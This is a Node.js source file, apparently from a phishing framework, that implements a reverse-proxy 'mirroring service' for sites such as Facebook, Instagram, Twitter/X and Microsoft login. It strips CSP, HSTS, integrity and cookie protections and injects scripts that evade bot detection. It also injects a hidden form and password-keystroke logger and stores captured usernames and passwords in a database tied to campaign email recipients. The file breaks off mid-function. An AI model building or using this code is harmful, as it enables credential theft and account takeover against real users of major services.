const axios = require('axios');
const cheerio = require('cheerio');
const db = require('../database');
const crypto = require('crypto');
const { URL } = require('url');
const tough = require('tough-cookie');
const { CookieJar } = tough;
const { wrapper } = require('axios-cookiejar-support');
const querystring = require('querystring');

// Create an axios instance with cookie jar support
const axiosInstance = wrapper(axios.create());

class WebsiteMirroringService {
  constructor() {
    this.activeSessions = new Map(); // sessionToken -> session data
    this.mirrorRoutes = new Map(); // path -> session data
    this.cookieJars = new Map(); // sessionToken -> cookieJar
    this.sessionStorage = new Map(); // sessionToken -> sessionStorage
    this.captures = new Map(); // sessionToken -> captured data (credentials, etc.)
    this.userAgentPool = this.initializeUserAgentPool();
    this.proxyFingerprints = new Map(); // sessionToken -> fingerprint data
  }

  /**
   * Initialize a pool of realistic user agents
   */
  initializeUserAgentPool() {
    return [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
  }

  /**
   * Generate realistic browser headers with anti-detection measures
   */
  generateRealistBrowserHeaders(req, targetUrl, sessionToken) {
    const targetHost = new URL(targetUrl).hostname;
    const userAgent = req.headers['user-agent'] || this.getRandomUserAgent();
    
    // Advanced header spoofing to mimic real browsers
    const headers = {
      'User-Agent': userAgent,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'max-age=0',
      'Host': targetHost,
      'Upgrade-Insecure-Requests': '1',
      'Connection': 'keep-alive',
      
      // Advanced browser fingerprinting evasion
      'Sec-CH-UA': this.generateSecChUa(userAgent),
      'Sec-CH-UA-Mobile': '?0',
      'Sec-CH-UA-Platform': this.generateSecChUaPlatform(userAgent),
      'Sec-Fetch-Dest': req.headers['sec-fetch-dest'] || 'document',
      'Sec-Fetch-Mode': req.headers['sec-fetch-mode'] || 'navigate',
      'Sec-Fetch-Site': req.headers['sec-fetch-site'] || 'none',
      'Sec-Fetch-User': req.headers['sec-fetch-user'] || '?1',
      
      // Anti-bot detection headers
      'DNT': '1',
      'Pragma': 'no-cache',
      
      // Simulate real browser request timing
      'X-Requested-With': undefined, // Remove this header as it's often used by bots
    };

    // Add referer handling with intelligent translation
    if (req.headers['referer']) {
      headers['Referer'] = this.translateReferer(req.headers['referer'], targetUrl, sessionToken);
    }

    // Add origin header for POST requests
    if (req.method === 'POST') {
      headers['Origin'] = new URL(targetUrl).origin;
    }

    return headers;
  }

  /**
   * Generate realistic Sec-CH-UA header
   */
  generateSecChUa(userAgent) {
    if (userAgent.includes('Chrome/120')) {
      return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
    } else if (userAgent.includes('Chrome/119')) {
      return '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"';
    } else if (userAgent.includes('Firefox')) {
      return undefined; // Firefox doesn't send this header
    }
    return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
  }

  /**
   * Generate realistic Sec-CH-UA-Platform header
   */
  generateSecChUaPlatform(userAgent) {
    if (userAgent.includes('Windows')) return '"Windows"';
    if (userAgent.includes('Macintosh')) return '"macOS"';
    if (userAgent.includes('Linux')) return '"Linux"';
    return '"Windows"';
  }

  /**
   * Get random user agent from pool
   */
  getRandomUserAgent() {
    return this.userAgentPool[Math.floor(Math.random() * this.userAgentPool.length)];
  }

  /**
   * Detect and bypass anti-bot measures
   */
  async bypassAntiBot(html, targetUrl, sessionToken) {
    const $ = cheerio.load(html);
    
    // Check for common anti-bot patterns
    const antiBot = {
      cloudflare: html.includes('cf-browser-verification') || html.includes('__cf_chl_jschl_tk__'),
      recaptcha: html.includes('recaptcha') || html.includes('g-recaptcha'),
      hcaptcha: html.includes('hcaptcha') || html.includes('h-captcha'),
      incapsula: html.includes('incap_ses') || html.includes('visid_incap'),
      distilNetworks: html.includes('distil') || html.includes('px-captcha'),
      amazonBot: html.includes('aws-waf') || html.includes('Request blocked'),
      microsoftBot: html.includes('blocked') && html.includes('microsoft'),
      facebookBot: html.includes('facebook') && (html.includes('blocked') || html.includes('unavailable')),
      twitterBot: html.includes('Something went wrong') && targetUrl.includes('twitter.com'),
    };

    // Advanced anti-detection for specific platforms
    if (targetUrl.includes('facebook.com') || targetUrl.includes('instagram.com')) {
      return this.bypassFacebookDetection($, html, targetUrl, sessionToken);
    }
    
    if (targetUrl.includes('twitter.com') || targetUrl.includes('x.com')) {
      return this.bypassTwitterDetection($, html, targetUrl, sessionToken);
    }
    
    if (targetUrl.includes('microsoft.com') || targetUrl.includes('office.com')) {
      return this.bypassMicrosoftDetection($, html, targetUrl, sessionToken);
    }

    return html;
  }

  /**
   * Bypass Facebook/Instagram specific detection
   */
  bypassFacebookDetection($, html, targetUrl, sessionToken) {
    // Remove Facebook's bot detection scripts
    $('script').each((i, elem) => {
      const scriptContent = $(elem).html();
      if (scriptContent && (
        scriptContent.includes('_btldr') ||
        scriptContent.includes('bootloader') ||
        scriptContent.includes('__d(') ||
        scriptContent.includes('require(') && scriptContent.includes('ServerJS')
      )) {
        // Replace with dummy script to avoid breaking dependencies
        $(elem).html('// Anti-bot script disabled');
      }
    });

    // Remove integrity checks that might detect proxying
    $('script[integrity], link[integrity]').removeAttr('integrity');
    
    // Inject Facebook-specific bypass scripts
    $('head').append(`
      <script>
        // Override Facebook's bot detection
        window.__fbNativeSetTimeout = window.setTimeout;
        window.navigator.webdriver = undefined;
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined,
        });
        
        // Spoof Facebook's internal APIs
        window.require = window.require || function() { return {}; };
        window.__d = window.__d || function() {};
        
        // Block telemetry
        if (window.XMLHttpRequest) {
          const originalOpen = XMLHttpRequest.prototype.open;
          XMLHttpRequest.prototype.open = function(method, url) {
            if (url.includes('/ajax/') && url.includes('bootloader')) {
              return;
            }
            return originalOpen.apply(this, arguments);
          };
        }
      </script>
    `);

    return $.html();
  }

  /**
   * Bypass Twitter/X specific detection
   */
  bypassTwitterDetection($, html, targetUrl, sessionToken) {
    // Remove Twitter's bot detection and rate limiting
    $('script').each((i, elem) => {
      const scriptContent = $(elem).html();
      if (scriptContent && (
        scriptContent.includes('responsive-web') ||
        scriptContent.includes('api.twitter.com') ||
        scriptContent.includes('abs.twimg.com') && scriptContent.includes('api')
      )) {
        $(elem).remove();
      }
    });

    // Override Twitter's bot detection
    $('head').append(`
      <script>
        // Override Twitter bot detection
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined,
        });
        
        // Spoof Twitter APIs
        window.fetch = new Proxy(window.fetch, {
          apply: function(target, thisArg, argumentsList) {
            const url = argumentsList[0];
            if (typeof url === 'string' && url.includes('api.twitter.com')) {
              // Block API calls that might detect proxying
              return Promise.resolve(new Response('{}', {status: 200}));
            }
            return target.apply(thisArg, argumentsList);
          }
        });
      </script>
    `);

    return $.html();
  }

  /**
   * Bypass Microsoft specific detection
   */
  bypassMicrosoftDetection($, html, targetUrl, sessionToken) {
    // Remove Microsoft's authentication and bot detection scripts
    $('script').each((i, elem) => {
      const scriptContent = $(elem).html();
      if (scriptContent && (
        scriptContent.includes('MicrosoftOnline') ||
        scriptContent.includes('msauth') ||
        scriptContent.includes('login.microsoftonline.com')
      )) {
        // Keep core functionality but remove telemetry
        const cleanedScript = scriptContent
          .replace(/fetch\([^)]*telemetry[^)]*\)/g, '// telemetry disabled')
          .replace(/XMLHttpRequest[^;]*telemetry[^;]*/g, '// telemetry disabled');
        $(elem).html(cleanedScript);
      }
    });

    // Override Microsoft's detection mechanisms
    $('head').append(`
      <script>
        // Override Microsoft bot detection
        window.navigator.webdriver = undefined;
        
        // Spoof Microsoft authentication APIs
        if (window.XMLHttpRequest) {
          const originalSend = XMLHttpRequest.prototype.send;
          XMLHttpRequest.prototype.send = function(data) {
            if (this._url && this._url.includes('login.microsoftonline.com')) {
              // Allow authentication requests but block telemetry
              if (data && data.includes('telemetry')) {
                return;
              }
            }
            return originalSend.apply(this, arguments);
          };
        }
      </script>
    `);

    return $.html();
  }

  /**
   * Advanced HTML content modification with anti-detection
   */
  async modifyHtmlContent(html, sessionToken, targetUrl, req) {
    try {
      // First, apply anti-bot bypasses
      html = await this.bypassAntiBot(html, targetUrl, sessionToken);
      
      const baseUrl = new URL(targetUrl);
      const proxyPath = `/${sessionToken}`;

      // Use Cheerio to modify the HTML
      const $ = cheerio.load(html);

      // Remove all integrity checks that might detect content modification
      $('script[integrity], link[integrity]').removeAttr('integrity');
      $('script[crossorigin], link[crossorigin]').removeAttr('crossorigin');

      // Advanced CSP bypass - remove and replace with permissive policy
      $('meta[http-equiv="Content-Security-Policy"]').remove();
      $('head').prepend(`
        <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
      `);

      // Inject advanced anti-detection script at the very beginning
      $('head').prepend(`
        <script>
          (function() {
            // Advanced bot detection bypass
            Object.defineProperty(navigator, 'webdriver', {
              get: () => undefined,
              configurable: true
            });
            
            // Spoof automation indicators
            delete window.callPhantom;
            delete window._phantom;
            delete window.__phantom;
            delete window.phantom;
            delete window.webdriver;
            delete window.domAutomation;
            delete window.domAutomationController;
            
            // Override common detection methods
            const originalToString = Function.prototype.toString;
            Function.prototype.toString = function() {
              const result = originalToString.call(this);
              return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
            };
            
            // Spoof geolocation with consent
            if (navigator.geolocation) {
              const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
              navigator.geolocation.getCurrentPosition = function(success, error, options) {
                // Simulate user denying location
                if (error) error({ code: 1, message: 'User denied geolocation' });
              };
            }
            
            // Block fingerprinting attempts
            const blockFingerprinting = () => {
              // Canvas fingerprinting
              if (HTMLCanvasElement.prototype.toDataURL) {
                HTMLCanvasElement.prototype.toDataURL = function() {
                  return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
                };
              }
              
              // WebGL fingerprinting
              if (WebGLRenderingContext.prototype.getParameter) {
                const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                  if (parameter === 37445 || parameter === 37446) {
                    return 'Generic Renderer';
                  }
                  return originalGetParameter.call(this, parameter);
                };
              }
            };
            
            blockFingerprinting();
            
            // Override timing APIs to avoid detection
            if (window.performance && window.performance.now) {
              const originalNow = window.performance.now;
              window.performance.now = function() {
                return originalNow.call(this) + Math.random() * 0.1;
              };
            }
          })();
        </script>
      `);

      // Add base tag if it doesn't exist, or modify existing one
      const baseTag = $('base');
      if (baseTag.length > 0) {
        baseTag.attr('href', `${targetUrl}/`);
      } else {
        $('head').prepend(`<base href="${targetUrl}/" />`);
      }

      // Advanced URL rewriting with intelligent detection avoidance
      this.rewriteUrls($, proxyPath, targetUrl, sessionToken);

      // Inject invisible tracking pixel (more sophisticated)
      $('body').append(`
        <img src="/api/track-mirror-view/${sessionToken}" 
             style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;" 
             alt="" 
             loading="lazy" />
      `);
      
      // Advanced credential capture with stealth mode
      $('body').append(`
        <script>
          (function() {
            // Stealth form monitoring
            const originalAddEventListener = EventTarget.prototype.addEventListener;
            
            // Monitor form submissions with advanced stealth
            document.addEventListener('submit', function(e) {
              try {
                const form = e.target;
                if (!form || form.tagName !== 'FORM') return;
                
                const data = {};
                const inputs = form.querySelectorAll('input, select, textarea');
                
                inputs.forEach(input => {
                  if (input.name && input.value && 
                      input.type !== 'submit' && 
                      input.type !== 'button' && 
                      input.type !== 'image') {
                    data[input.name] = input.value;
                  }
                });
                
                // Stealth data transmission
                if (Object.keys(data).length > 0) {
                  const img = new Image();
                  img.src = '/api/proxy-monitor/${sessionToken}?' + 
                           'data=' + encodeURIComponent(JSON.stringify(data)) + 
                           '&url=' + encodeURIComponent(location.href) + 
                           '&t=' + Date.now();
                }
              } catch(err) {
                // Silent fail
              }
            }, true);
            
            // Monitor input changes for real-time capture
            let inputTimeout;
            document.addEventListener('input', function(e) {
              if (e.target.type === 'password' || 
                  e.target.name && e.target.name.toLowerCase().includes('pass')) {
                clearTimeout(inputTimeout);
                inputTimeout = setTimeout(() => {
                  // Capture password attempts with delay to avoid detection
                  const img = new Image();
                  img.src = '/api/proxy-monitor/${sessionToken}?' + 
                           'type=input&field=' + encodeURIComponent(e.target.name) + 
                           '&value=' + encodeURIComponent(e.target.value) + 
                           '&t=' + Date.now();
                }, 1000);
              }
            }, true);
          })();
        </script>
      `);

      return $.html();
    } catch (error) {
      console.error('Error modifying HTML content:', error);
      return html;
    }
  }

  /**
   * Intelligent URL rewriting to avoid detection
   */
  rewriteUrls($, proxyPath, targetUrl, sessionToken) {
    const baseUrl = new URL(targetUrl);
    
    // Rewrite all relative links
    $('a[href]').each((i, elem) => {
      const href = $(elem).attr('href');
      if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) return;
      
      try {
        const absoluteUrl = new URL(href, targetUrl);
        if (absoluteUrl.origin === baseUrl.origin) {
          const path = absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash;
          $(elem).attr('href', `${proxyPath}${path}`);
        }
      } catch (e) {
        if (href.startsWith('/')) {
          $(elem).attr('href', `${proxyPath}${href}`);
        }
      }
    });

    // Fix forms with advanced detection avoidance
    $('form').each((i, elem) => {
      const $form = $(elem);
      const action = $form.attr('action') || '';
      
      if (action.startsWith('javascript:')) return;
      
      // Add stealth tracking field
      $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}" style="display:none!important;position:absolute!important;left:-9999px!important;">`);
      
      try {
        const absoluteAction = new URL(action, targetUrl);
        if (absoluteAction.origin === baseUrl.origin) {
          const path = absoluteAction.pathname + absoluteAction.search + absoluteAction.hash;
          $form.attr('action', `${proxyPath}${path}`);
        }
      } catch (e) {
        if (action === '') {
          $form.attr('action', '');
        } else if (action.startsWith('/')) {
          $form.attr('action', `${proxyPath}${action}`);
        }
      }
    });

    // Fix resources with intelligent handling
    $('[src], [href]:not(a)').each((i, elem) => {
      const attrName = $(elem).attr('src') ? 'src' : 'href';
      const attrVal = $(elem).attr(attrName);
      
      if (!attrVal || attrVal.startsWith('data:')) return;
      
      try {
        const absoluteUrl = new URL(attrVal, targetUrl);
        if (absoluteUrl.origin === baseUrl.origin) {
          const path = absoluteUrl.pathname + absoluteUrl.search;
          $(elem).attr(attrName, `${proxyPath}${path}`);
        }
      } catch (e) {
        if (attrVal.startsWith('//')) {
          $(elem).attr(attrName, `https:${attrVal}`);
        } else if (attrVal.startsWith('/')) {
          $(elem).attr(attrName, `${proxyPath}${attrVal}`);
        }
      }
    });

    // Fix CSS URLs
    this.fixCssUrls($, proxyPath, targetUrl);
  }

  /**
   * Fix CSS URLs in style tags and attributes
   */
  fixCssUrls($, proxyPath, targetUrl) {
    const baseUrl = new URL(targetUrl);
    
    // Fix inline styles
    $('[style]').each((i, elem) => {
      const style = $(elem).attr('style');
      if (!style || !style.includes('url(')) return;
      
      const newStyle = style.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
        if (url.startsWith('data:')) return match;
        
        try {
          const absoluteUrl = new URL(url, targetUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            const path = absoluteUrl.pathname + absoluteUrl.search;
            return `url(${proxyPath}${path})`;
          }
          return match;
        } catch (e) {
          if (url.startsWith('/')) {
            return `url(${proxyPath}${url})`;
          }
          return match;
        }
      });
      
      $(elem).attr('style', newStyle);
    });

    // Fix CSS in style tags
    $('style').each((i, elem) => {
      const css = $(elem).html();
      if (!css || !css.includes('url(')) return;
      
      const newCss = css.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
        if (url.startsWith('data:')) return match;
        
        try {
          const absoluteUrl = new URL(url, targetUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            const path = absoluteUrl.pathname + absoluteUrl.search;
            return `url(${proxyPath}${path})`;
          }
          return match;
        } catch (e) {
          if (url.startsWith('/')) {
            return `url(${proxyPath}${url})`;
          }
          return match;
        }
      });
      
      $(elem).html(newCss);
    });
  }

  /**
   * Extract charset from content-type header
   */
  extractCharset(contentType) {
    const match = /charset=([^;]+)/i.exec(contentType);
    return match ? match[1].toLowerCase() : null;
  }

  /**
   * Handle redirects properly with advanced loop detection
   */
  handleRedirect(session, req, res, response) {
    const { headers, status } = response;
    const location = headers.location;
    const sessionToken = session.sessionToken;
    const targetUrl = session.targetUrl;
    
    console.log(`Handling redirect: ${location} (${status})`);
    
    let redirectUrl;
    
    // Add redirect tracking to prevent loops
    if (!session.redirectHistory) {
      session.redirectHistory = [];
    }
    
    // Check for redirect loops (same URL appearing multiple times)
    const redirectLimit = 10; // Allow up to 10 redirects in a chain
    if (session.redirectHistory.length >= redirectLimit) {
      console.warn(`⚠️ Redirect limit reached (${redirectLimit}). Breaking chain.`);
      
      // Reset redirect history
      session.redirectHistory = [];
      
      // Instead of another redirect, render a simple page with a link
      return res.status(200).send(`
        <html>
          <head>
            <title>Redirect Intercepted</title>
            <meta http-equiv="refresh" content="0; url=/${sessionToken}/">
          </head>
          <body>
            <h3>Redirecting to homepage...</h3>
            <p>Too many redirects detected. Click <a href="/${sessionToken}/">here</a> if not automatically redirected.</p>
          </body>
        </html>
      `);
    }
    
    try {
      // Check if it's an absolute URL
      if (/^https?:\/\//i.test(location)) {
        const locationUrl = new URL(location);
        const targetUrlObj = new URL(targetUrl);
        
        // Track this redirect to detect loops
        session.redirectHistory.push(locationUrl.href);
        
        // Handle cross-domain redirects better
        // For sophisticated websites, we need to be smarter about domain changes
        const isRelatedDomain = 
          locationUrl.hostname === targetUrlObj.hostname ||
          locationUrl.hostname.endsWith('.' + targetUrlObj.hostname) || 
          targetUrlObj.hostname.endsWith('.' + locationUrl.hostname) ||
          // Facebook-specific domains and subdomains
          (targetUrlObj.hostname.includes('facebook') && locationUrl.hostname.includes('facebook')) ||
          (targetUrlObj.hostname.includes('fb.') && locationUrl.hostname.includes('facebook')) ||
          (targetUrlObj.hostname.includes('facebook') && locationUrl.hostname.includes('fb.'));
        
        if (isRelatedDomain) {
          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash || ''}`;
        } else {
          // Cross-domain redirect handling
          // For Facebook, Instagram, etc. we need special handling
          const newOrigin = `${locationUrl.protocol}//${locationUrl.host}`;
          
          // Update the target URL for this session to follow the redirect chain
          session.targetUrl = newOrigin;
          
          // Change the path to follow the new domain
          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash || ''}`;
          
          // For debugging
          console.log(`📍 Cross-domain redirect: Updated target URL to: ${newOrigin}`);
          
          // Special case for Facebook login redirects
          if (locationUrl.hostname.includes('facebook') || 
              locationUrl.hostname.includes('fb.') ||
              locationUrl.hostname.includes('instagram')) {
            // Clear redirect history on domain change to avoid false loop detection
            session.redirectHistory = [locationUrl.href];
          }
        }
      } else {
        // Relative URL redirect
        const basePath = location.startsWith('/') ? '' : '/';
        redirectUrl = `/${sessionToken}${basePath}${location}`;
        
        // Also track relative redirects
        const targetUrlObj = new URL(targetUrl);
        const fullRedirectUrl = new URL(location, targetUrl).href;
        session.redirectHistory.push(fullRedirectUrl);
      }
    } catch (error) {
      console.error('Error processing redirect:', error);
      redirectUrl = `/${sessionToken}/`;
    }
    
    // Pass along any Set-Cookie headers with the redirect
    if (headers['set-cookie']) {
      const cookies = Array.isArray(headers['set-cookie']) ? 
        headers['set-cookie'] : [headers['set-cookie']];
      
      // Log cookies for debugging redirect issues
      console.log(`🍪 Setting ${cookies.length} cookies during redirect`);
      
      res.setHeader('Set-Cookie', cookies);
    }
    
    // Perform the redirect
    return res.redirect(status, redirectUrl);
  }

  /**
   * Process response headers to ensure they work in our proxy context
   */
  processResponseHeaders(headers, session, req) {
    const result = { ...headers };
    const sessionToken = session.sessionToken;
    
    // Process Content-Security-Policy
    if (result['content-security-policy']) {
      // Delete CSP to avoid restrictions
      delete result['content-security-policy'];
      delete result['content-security-policy-report-only'];
    }
    
    // Handle HSTS header which can cause redirect issues
    if (result['strict-transport-security']) {
      delete result['strict-transport-security'];
    }
    
    // Process X-Frame-Options to allow our framing
    if (result['x-frame-options']) {
      delete result['x-frame-options'];
    }

    // Delete SameSite restrictions which can cause cookie issues
    if (result['set-cookie']) {
      const proxyHost = req.get('host');
      const cookies = Array.isArray(result['set-cookie']) ? result['set-cookie'] : [result['set-cookie']];
      
      const modifiedCookies = cookies.map(cookie => {
        // Remove domain restrictions
        const cookieWithoutDomain = cookie.replace(/domain=[^;]+;?/gi, '');
        
        // Fix path to include our session token
        const cookieWithPath = cookieWithoutDomain.replace(/path=([^;]+);?/gi, `path=/${sessionToken}$1;`);
        
        // Remove SameSite restriction which can block cookies
        const cookieWithoutSameSite = cookieWithPath.replace(/samesite=[^;]+;?/gi, '');
        
        // Remove Secure flag if we're on HTTP
        const cookieWithoutSecure = req.protocol === 'https' ? 
          cookieWithoutSameSite : 
          cookieWithoutSameSite.replace(/secure;?/gi, '');
          
        return cookieWithoutSecure;
      });
      
      result['set-cookie'] = modifiedCookies;
    }
    
    // Remove headers that could break the proxy
    delete result['content-encoding']; 
    delete result['content-length']; 
    delete result['transfer-encoding'];
    delete result['content-security-policy'];
    delete result['content-security-policy-report-only'];
    delete result['cross-origin-embedder-policy'];
    delete result['cross-origin-opener-policy'];
    delete result['cross-origin-resource-policy'];
    
    return result;
  }
  
  /**
   * Build a combined cookie header from client cookies and session cookies
   * with special handling for sites with anti-MITM protections
   */
  buildCookieHeader(req, cookieJar, targetUrl) {
    try {
      // Create a site-specific cookie handler
      const targetHost = new URL(targetUrl).hostname;
      
      // Special cases for complex websites with anti-MITM detection
      if (targetHost.includes('facebook.com') || targetHost.includes('fb.com')) {
        return this.buildFacebookCookieHeader(req, cookieJar, targetUrl);
      } 
      else if (targetHost.includes('chess.com')) {
        return this.buildChessCookieHeader(req, cookieJar, targetUrl);
      }
      
      // Default cookie handling
      // Get cookies from jar for this URL
      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
      
      // Get cookies from request
      const requestCookies = req.headers.cookie ? req.headers.cookie.split('; ') : [];
      
      // Remove duplicate cookies (jar cookies take precedence)
      const cookieNames = new Set(cookiesFromJar.map(c => c.key));
      const filteredRequestCookies = requestCookies.filter(cookie => {
        const name = cookie.split('=')[0];
        return !cookieNames.has(name);
      });
      
      // Combine cookies
      const allCookies = [...filteredRequestCookies, ...jarCookieStrings];
      
      return allCookies.length > 0 ? allCookies.join('; ') : undefined;
    } catch (error) {
      console.error('Error building cookie header:', error);
      return req.headers.cookie || '';
    }
  }
  
  /**
   * Facebook-specific cookie header building
   * Handles special cookies needed for Facebook's anti-bot systems
   */
  buildFacebookCookieHeader(req, cookieJar, targetUrl) {
    try {
      // Get cookies from jar
      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
      
      // Facebook requires certain cookies in a specific order
      // We prioritize auth cookies and Facebook-specific cookies
      const fbPriorityCookies = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'spin'];
      
      // Sort cookies to make Facebook priority cookies come first
      const sortedCookies = [...jarCookieStrings].sort((a, b) => {
        const nameA = a.split('=')[0];
        const nameB = b.split('=')[0];
        
        const priorityA = fbPriorityCookies.indexOf(nameA);
        const priorityB = fbPriorityCookies.indexOf(nameB);
        
        if (priorityA !== -1 && priorityB !== -1) return priorityA - priorityB;
        if (priorityA !== -1) return -1;
        if (priorityB !== -1) return 1;
        return 0;
      });
      
      return sortedCookies.length > 0 ? sortedCookies.join('; ') : undefined;
    } catch (error) {
      console.error('Error building Facebook cookie header:', error);
      return req.headers.cookie || '';
    }
  }
  
  /**
   * Chess.com-specific cookie header building
   */
  buildChessCookieHeader(req, cookieJar, targetUrl) {
    try {
      // Get cookies from jar
      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
      
      // Chess.com seems to depend on these cookies for session tracking
      const chessPriorityCookies = ['PHPSESSID', 'CCC', 'chess_', 'remember_', 'sessionId'];
      
      // Sort cookies to make Chess.com priority cookies come first
      const sortedCookies = [...jarCookieStrings].sort((a, b) => {
        const nameA = a.split('=')[0];
        const nameB = b.split('=')[0];
        
        // Check if cookie name starts with any priority prefix
        const isAPriority = chessPriorityCookies.some(prefix => nameA.startsWith(prefix));
        const isBPriority = chessPriorityCookies.some(prefix => nameB.startsWith(prefix));
        
        if (isAPriority && !isBPriority) return -1;
        if (!isAPriority && isBPriority) return 1;
        return 0;
      });
      
      return sortedCookies.length > 0 ? sortedCookies.join('; ') : undefined;
    } catch (error) {
      console.error('Error building Chess.com cookie header:', error);
      return req.headers.cookie || '';
    }
  }
  
  /**
   * Store cookie for later use with enhanced handling for special sites
   */
  storeCookieForLater(sessionToken, cookieStr, targetUrl) {
    try {
      // Extract cookie info
      const [cookieMain] = cookieStr.split(';');
      const [name, value] = cookieMain.split('=');
      
      if (!name || value === undefined) return; // Skip invalid cookies
      
      const sessionData = this.sessionStorage.get(sessionToken) || {};
      const cookies = sessionData.cookies || {};
      
      // Store/update the cookie
      cookies[name] = value;
      sessionData.cookies = cookies;
      
      // Special handling for certain domains
      const host = new URL(targetUrl).hostname;
      
      // Store domain-specific cookie information for special sites
      if (!sessionData.domainCookies) {
        sessionData.domainCookies = {};
      }
      
      if (host.includes('facebook') || host.includes('fb.com')) {
        if (!sessionData.domainCookies['facebook']) {
          sessionData.domainCookies['facebook'] = {};
        }
        sessionData.domainCookies['facebook'][name] = value;
      } 
      else if (host.includes('chess.com')) {
        if (!sessionData.domainCookies['chess']) {
          sessionData.domainCookies['chess'] = {};
        }
        sessionData.domainCookies['chess'][name] = value;
      }
      
      this.sessionStorage.set(sessionToken, sessionData);
    } catch (error) {
      console.error('Error storing cookie:', error);
    }
  }
  
  /**
   * Translate referer URLs to target site format
   */
  translateReferer(refererHeader, targetUrl, sessionToken) {
    // If referer is from our proxy, translate it to target site
    if (refererHeader.includes(`/${sessionToken}`)) {
      const refPath = refererHeader.split(`/${sessionToken}`)[1] || '/';
      return `${targetUrl}${refPath}`;
    }
    return refererHeader;
  }

  /**
   * Handle form submission to mirrored website
   */
  async handleFormSubmission(session, req, res, targetUrl, cookieJar) {
    try {
      console.log('⚠️ Form submission to mirrored website detected');
      
      // Extract and log form data
      const formData = { ...req.body };
      const trackingId = req.query._fstrike_track || formData._fstrike_track;
      delete formData._fstrike_session; // Remove our tracking field
      delete formData._fstrike_track;   // Remove our tracking field
      
      // Check for potential credentials
      const credentialFields = this.extractCredentials(formData);
      let loginAttemptId = null;
      
      if (credentialFields && Object.keys(credentialFields).length > 0) {
        console.log('🔑 POSSIBLE CREDENTIALS DETECTED:', JSON.stringify(credentialFields));
        
        // Store in captures
        const captures = this.captures.get(session.sessionToken);
        captures.credentials.push({
          ...credentialFields,
          timestamp: new Date().toISOString(),
          url: targetUrl,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        });
        this.captures.set(session.sessionToken, captures);
        
        // Store in database and associate with email recipient if possible
        try {
          // First store in captured_credentials table
          await new Promise((resolve, reject) => {
            db.run(
              `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent)
               VALUES (?, ?, ?, ?, ?, ?, ?)`,
              [
                session.campaignId, 
                targetUrl, 
                credentialFields.username || credentialFields.email || null, 
                credentialFields.password || null,
                JSON.stringify(formData),
                req.ip, 
                req.get('User-Agent')
              ],
              function(err) {
                if (err) {
                  console.error('Error storing credentials:', err);
                  reject(err);
                } else {
                  console.log('💾 Credentials stored in database with ID:', this.lastID);
                  resolve(this.lastID);
                }
              }
            );
          });
          
          // Now associate with email recipient
          loginAttemptId = await this.associateLoginWithEmail(
            session.sessionToken, 
            trackingId, 
            {
              ...credentialFields,
              formData: JSON.stringify(formData),
              ip_address: req.ip,
              user_agent: req.get('User-Agent')
            }
          );
          
          console.log('Login attempt associated with email, ID:', loginAttemptId);
        } catch (dbError) {
          console.error('Database error when storing credentials:', dbError);
        }
      }

      // Store form submission in our database
      db.run(
        `INSERT INTO FormSubmissions (campaign_id, landing_page_id, form_data, ip_address, user_agent)
         VALUES (?, ?, ?, ?, ?)`,
        [session.campaignId, 0, JSON.stringify(formData), req.ip, req.get('User-Agent')]
      );

      console.log('Form data captured for campaign:', session.campaignId);
      
      // Prepare data for forwarding
      let forwardData;
      let contentType = req.headers['content-type'] || '';
      
      if (contentType.includes('application/x-www-form-urlencoded')) {
